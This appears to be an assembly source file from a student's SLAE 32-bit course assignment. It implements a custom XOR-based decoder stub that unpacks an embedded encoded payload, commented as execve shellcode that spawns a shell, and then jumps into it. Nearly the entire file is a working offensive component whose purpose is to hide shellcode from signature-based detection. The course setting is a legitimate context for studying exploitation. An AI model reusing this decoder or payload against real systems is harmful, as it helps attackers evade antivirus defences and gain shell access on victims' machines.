; John
;
; Custom Encoder - Assignment 4
;
; SecurityTube Linux Assembler Expert (SLAE) 32-bit
;
; October 24, 2020


global _start

section .text

_start:

	jmp short call_shellcode

decoder:
	pop esi													; esi = EncodedShellcode
	lea edi, [esi]									; edi moves along shellcode length
	xor eax, eax
	mov al, 6												; eax = 6 set-of-six counter
	xor ebx, ebx										; ebx = 0
	xor ecx, ecx										; normal byte counter = 0. start at index 0

decode:
	; check for end of EncodedShellcode. Hence the XOR with 0x69
	mov bl, byte [esi]		; bl = first byte of EncodedShellcode
	xor bl, 0x69										; check if bl = 0x69
	jz short EncodedShellcode			; jump to EncodedShellcode if end is reached because it's decoded!

next:
	; Need to decode first 5 bytes before running through any movement stuff
	; Movement handled simultaneously for brevity
	cmp ecx, 4											; is the 5th byte reached?
	jnz Normal											; do XOR 0x24 for first four bytes
	mov bl, byte [esi + ecx]	; load 5th byte into bl
	xor bl, 0x25										; XOR 0x25 for 5th byte
	mov byte [edi], bl							; store decoded byte into edi location
	xor ecx, ecx										; 5th byte is reached. Reset to 0
	inc edi													; edi points to next address of shellcode
	add esi, 6
	jmp short decode								; go to movement instructions

Normal:
	mov bl, byte [esi + ecx]	; load byte into bl
	xor bl, 0x24										; do XOR 0x24 for first 4 bytes
	mov byte [edi], bl							; store decoded byte into edi location
	inc edi													; edi points to next address of shellcode
	inc ecx													; counter + 1
	jmp short next									; decode next byte

call_shellcode:
	call decoder
	;EncodedShellcode: db <encoded execve-stack code>
	EncodedShellcode: db 0x15,0xe4,0x74,0x4c,0x0a,0x69,0x0b,0x57,0x4c,0x4c,0x0a,0x69,0x46,0x4d,0x4a,0xad,0xc6,0x69,0x74,0xad,0xc6,0x77,0xac,0x69,0xc5,0x94,0x2f,0xe9,0xa5,0x69, 0x69, 0x69

